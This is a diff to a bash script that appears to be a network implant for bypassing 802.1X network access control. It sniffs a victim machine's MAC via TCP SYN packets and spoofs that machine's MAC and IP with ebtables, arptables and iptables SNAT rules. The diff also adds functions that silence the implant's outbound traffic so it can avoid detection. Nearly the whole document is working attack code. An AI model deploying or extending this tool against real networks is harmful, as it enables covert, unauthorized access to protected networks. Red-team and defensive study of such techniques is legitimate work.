@@ -26,6 +26,7 @@ DOWNSTREAM="${DOWNSTREAM_IFACE:-eth1}"
 BRIDGE="${BRIDGE_NAME:-br0}"
 STATEFILE="/tmp/.raccoon_nac_state"
 DISCOVERY_TIMEOUT="${DISCOVERY_TIMEOUT:-60}"
+NAT_PORT_RANGE="${NAT_PORT_RANGE:-61000-62000}"
 
 log() { echo -e "${GREEN}[+]${NC} $*"; }
 warn() { echo -e "${YELLOW}[!]${NC} $*"; }
@@ -103,11 +104,11 @@ setup_eapol() {
 # ── Phase 2: discovery ──
 
 discover_victim_mac() {
-    info "Phase 2 — sniffing for victim MAC on $DOWNSTREAM"
+    info "Phase 2 — sniffing for victim MAC on $DOWNSTREAM (TCP SYN)"
     VICTIM_MAC=""
 
     local output
-    output=$(timeout "$DISCOVERY_TIMEOUT" tcpdump -i "$DOWNSTREAM" -c 1 -e -nn -q 2>&1) || true
+    output=$(timeout "$DISCOVERY_TIMEOUT" tcpdump -i "$DOWNSTREAM" -c 1 -e -nn 'tcp[13] & 2 != 0' 2>&1) || true
 
     while IFS= read -r mac; do
         mac_lower=$(echo "$mac" | tr '[:upper:]' '[:lower:]')
@@ -157,8 +158,29 @@ discover_arp() {
 
 # ── Phase 3: rewrite rules ──
 
+go_silent() {
+    info "Going silent — dropping all OUTPUT traffic"
+    arptables -A OUTPUT -o "$UPSTREAM" -j DROP 2>/dev/null || true
+    arptables -A OUTPUT -o "$DOWNSTREAM" -j DROP 2>/dev/null || true
+    iptables -A OUTPUT -o "$UPSTREAM" -j DROP 2>/dev/null || true
+    iptables -A OUTPUT -o "$DOWNSTREAM" -j DROP 2>/dev/null || true
+}
+
+go_live() {
+    info "Going live — removing OUTPUT DROP rules"
+    arptables -D OUTPUT -o "$UPSTREAM" -j DROP 2>/dev/null || true
+    arptables -D OUTPUT -o "$DOWNSTREAM" -j DROP 2>/dev/null || true
+    iptables -D OUTPUT -o "$UPSTREAM" -j DROP 2>/dev/null || true
+    iptables -D OUTPUT -o "$DOWNSTREAM" -j DROP 2>/dev/null || true
+}
+
 apply_rules() {
     info "Phase 3 — applying MAC/IP rewrite rules"
+
+    go_silent
+
+    # Enable bridge-nf-call-iptables so SNAT works on bridged traffic
+    sysctl -w net.bridge.bridge-nf-call-iptables=1 > /dev/null 2>&1 || true
 
     # Spoof bridge MAC
     ip link set "$BRIDGE" down
@@ -169,9 +191,11 @@ apply_rules() {
     # ebtables: L2 rewriting
     ebtables -t nat -F
 
-    # Outgoing: implant's real MAC → victim MAC
+    # Outgoing: implant's real MAC → victim MAC (on switch and bridge)
     ebtables -t nat -A POSTROUTING -s "$IMPLANT_MAC" \
         -o "$UPSTREAM" -j snat --to-source "$VICTIM_MAC"
+    ebtables -t nat -A POSTROUTING -s "$IMPLANT_MAC" \
+        -o "$BRIDGE" -j snat --to-source "$VICTIM_MAC"
 
     # Incoming: if gateway sends to victim MAC, rewrite dst to implant MAC
     if [ -n "$GATEWAY_MAC" ]; then
@@ -182,15 +206,18 @@ apply_rules() {
 
     log "ebtables L2 rules applied"
 
-    # iptables: L3 NAT
+    # iptables: L3 NAT with port range to avoid collisions
     if [ -n "$VICTIM_IP" ]; then
         iptables -t nat -A POSTROUTING -o "$BRIDGE" \
-            -j SNAT --to-source "$VICTIM_IP"
-        log "iptables SNAT → $VICTIM_IP"
+            -p tcp -j SNAT --to "$VICTIM_IP:$NAT_PORT_RANGE"
+        iptables -t nat -A POSTROUTING -o "$BRIDGE" \
+            -p udp -j SNAT --to "$VICTIM_IP:$NAT_PORT_RANGE"
+        iptables -t nat -A POSTROUTING -o "$BRIDGE" \
+            -p icmp -j SNAT --to "$VICTIM_IP"
+        log "iptables SNAT → $VICTIM_IP:$NAT_PORT_RANGE"
     fi
 
     # arptables: ARP source rewriting
-    arptables -F 2>/dev/null || true
     if [ -n "$VICTIM_MAC" ]; then
         arptables -A OUTPUT -o "$BRIDGE" \
             --opcode request -j mangle --mangle-mac-s "$VICTIM_MAC" 2>/dev/null || true
@@ -210,6 +237,8 @@ apply_rules() {
         dhclient -nw "$BRIDGE" 2>/dev/null || true
     fi
 
+    go_live
+
     echo ""
     log "NAC bypass ACTIVE"
     log "  Victim:  $VICTIM_MAC / ${VICTIM_IP:-unknown}"
@@ -224,9 +253,16 @@ do_reset() {
     load_state
 
     ebtables -t nat -F 2>/dev/null || true
-    ebtables -t filter -F 2>/dev/null || true
     iptables -t nat -F 2>/dev/null || true
-    arptables -F 2>/dev/null || true
+
+    # Remove arptables mangle rules (not flush — preserve other rules)
+    arptables -D OUTPUT -o "$BRIDGE" \
+        --opcode request -j mangle --mangle-mac-s "${VICTIM_MAC:-00:00:00:00:00:00}" 2>/dev/null || true
+    arptables -D OUTPUT -o "$BRIDGE" \
+        --opcode reply -j mangle --mangle-mac-s "${VICTIM_MAC:-00:00:00:00:00:00}" 2>/dev/null || true
+
+    # Restore bridge-nf-call-iptables to transparent default
+    sysctl -w net.bridge.bridge-nf-call-iptables=0 > /dev/null 2>&1 || true
 
     if [ -n "${ORIG_MAC_BRIDGE:-}" ] && [ "$ORIG_MAC_BRIDGE" != "unknown" ]; then
         ip link set "$BRIDGE" down 2>/dev/null || true
@@ -235,8 +271,11 @@ do_reset() {
         log "Restored bridge MAC to $ORIG_MAC_BRIDGE"
     fi
 
+    # Re-enable EAPOL forwarding for transparent bridge operation
+    setup_eapol
+
     rm -f "$STATEFILE"
-    log "NAC bypass rules cleared"
+    log "NAC bypass rules cleared, bridge transparent"
 }
 
 # ── Status ──
